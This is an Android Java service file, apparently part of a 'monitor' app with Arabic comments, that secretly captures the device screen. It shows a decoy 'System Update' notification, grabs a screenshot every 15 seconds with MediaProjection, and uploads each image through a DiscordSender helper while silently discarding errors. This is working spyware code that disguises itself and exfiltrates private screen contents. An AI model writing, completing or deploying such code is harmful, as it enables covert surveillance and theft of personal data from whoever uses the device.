package com.tom5.monitor;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // تشغيل الإشعار فوراً (أهم خطوة لمنع الكراش)
        String cid = "sys_service";
        NotificationChannel ch = new NotificationChannel(cid, "System", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(1, new NotificationCompat.Builder(this, cid)
                .setContentTitle("System Update")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());

        if (intent != null && intent.hasExtra("resData")) {
            int resCode = intent.getIntExtra("resCode", -1);
            Intent resData = intent.getParcelableExtra("resData");
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resCode, resData);
            startCapture();
        }
        return START_STICKY;
    }

    private void startCapture() {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.getDefaultDisplay().getMetrics(metrics);
        // تقليل الحجم للنصف لضمان السرعة ومنع استهلاك الذاكرة
        imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Capture", 
                metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                capture();
                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
            }
        }, 5000);
    }

    private void capture() {
        try (Image image = imageReader.acquireLatestImage()) {
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                File file = new File(getCacheDir(), "s.png");
                try (FileOutputStream out = new FileOutputStream(file)) {
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out); // ضغط الصورة للسرعة
                    DiscordSender.sendPhoto(file);
                }
                bitmap.recycle();
            }
        } catch (Exception e) {}
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
